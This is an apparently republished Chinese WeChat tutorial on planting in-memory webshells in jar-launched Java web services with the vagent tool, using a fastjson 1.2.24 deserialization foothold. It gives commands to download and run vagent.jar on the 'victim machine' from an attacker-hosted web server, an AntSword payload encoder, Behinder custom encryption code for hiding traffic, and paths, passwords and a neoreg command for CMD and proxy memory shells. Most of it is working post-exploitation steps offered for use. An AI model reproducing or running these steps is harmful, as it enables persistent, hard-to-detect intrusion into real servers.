> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YhvjA8RO_mfUisAuy-NmVQ)

免责声明

由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

**前言：**

    攻防或渗透过程中经常会遇到 jar 包启的 web 程序，这种就没办法通过搜索静态文件找目录写马了，这里演示使用 vagent 注入工具注入内存马。

**案例演示：**

    此处使用 fastjson 1.2.24 反序列化来做演示。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600jeV71zsItpDW9dKpCvpEuE2Y4rCvdISAcBkyibicxpjNXlWN1vWogibBLw/640?wx_fmt=png&from=appmsg)

    这里不再演示如何通过反序列化获取权限，这个不是重点。

    同样的先把会话反弹到服务器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600jbKRrjf7hibe1VU43u56KmlOiaicoBxfwHiauH5oYJ1DO49mBnAeCMnUHAQ/640?wx_fmt=png&from=appmsg)

    接着需要将 vagent 下载到被害机器内。

```
python3 -m
http.server 1234 #启动web服务器
wgethttp://xx.xx.xx.xx:1234/vagent.jar  #下载工具
java -jar vagent.jar #执行

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600jHD8VbNLGrbzBs9oW0Kze4onXtv6ey8pa1A1X6oSQCic8SJfvMX3tB1g/640?wx_fmt=png&from=appmsg)

    此处根据返回可知注入成功。

    其中蚁剑连接需要配置编码器，其中链接以 /faviconjs 结尾密码是 a。编码器内容如下图：

```
'use strict';
module.exports = (pwd, data, ext={}) =>
{
data[pwd]=
Buffer.from(Buffer.from(data['_']).toString('base64')).toString('base64');
delete data['_'];
return data;
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600jnRXF1q3UxvWic5gou5KUgP8ibpYQRnibbhfEBAogVX5dLCA78ULflBicIQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600joRUjUqd7ia6WjY8WHvQsn5vkrdicd38fcvGYR7qqehibCdnibZjbu0iaS7w/640?wx_fmt=png&from=appmsg)

    冰蝎链接以 /faviconb 结尾，需要自定义加解密协议。

```
private byte[] Encrypt(byte[] data) {
    byte[] dt = new byte[data.length];
    for (int i = 0; i < data.length; i++) {
        dt[i] = (byte) (data[i] + 1);
    }
    try {
        java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
        java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
        g.write(dt);
        g.close();
        byte[] c = o.toByteArray();
        byte[] ct = new byte[c.length];
        for (int i = 0; i < c.length; i++) {
            ct[i] = (byte) (c[i] + 1);
        }
        return ct;
    } catch (Exception ignored) {
    }
    return data;
}
private byte[] Decrypt(byte[] data) {
    byte[] dt = new byte[data.length];
    for (int i = 0; i < data.length; i++) {
        dt[i] = (byte) (data[i] - 1);
    }
    try {
        java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(dt);
        java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, dt.length);
        byte[] c = r(i);
        byte[] ct = new byte[c.length];
        for (int b = 0; b < c.length; b++) {
            ct[b] = (byte) (c[b] - 1);
        }
        return ct;
    } catch (Exception ignored) {
    }
    return data;
}
private byte[] r(java.io.InputStream i) {
    byte[] temp = new byte[1024];
    java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
    int n;
    try {
        while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
        }} catch (Exception ignored) {
    }
    return b.toByteArray();
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1znIwPOw2JJ8oj2tYtib6AxN3yMhU600joIcye3ZyTVEV8XOZKpqsQj7iccGHQKGR4ARRhv8zlBL0hpsEvbHqGfA/640?wx_fmt=png&from=appmsg)

其他内存马：  

```
1.CMD马
链接：以 /faviconc 结尾
POST两次Base64以后的命令
2.Neo代理内存马
链接：以 /faviconneo 结尾
密码：page，要加--skip
python3 neoreg.py -k page -u URL -p 1083 --skip
3.Suo5代理内存马
链接：以 /faviconsuo 结尾
无需密码
4.WebSocket代理内存马
链接：以 /faviconws 结尾
无需密码，使用gost进行连接

```

**总结**

    此工具主要适用于 jar 包启动的 web 服务获取权限后为了方便后续操作注入内存马, 也可以是常规工具内存马注入不进去（如 shiro 反序列化），前提环境能够出网。

参考文章：

https://github.com/veo/vagent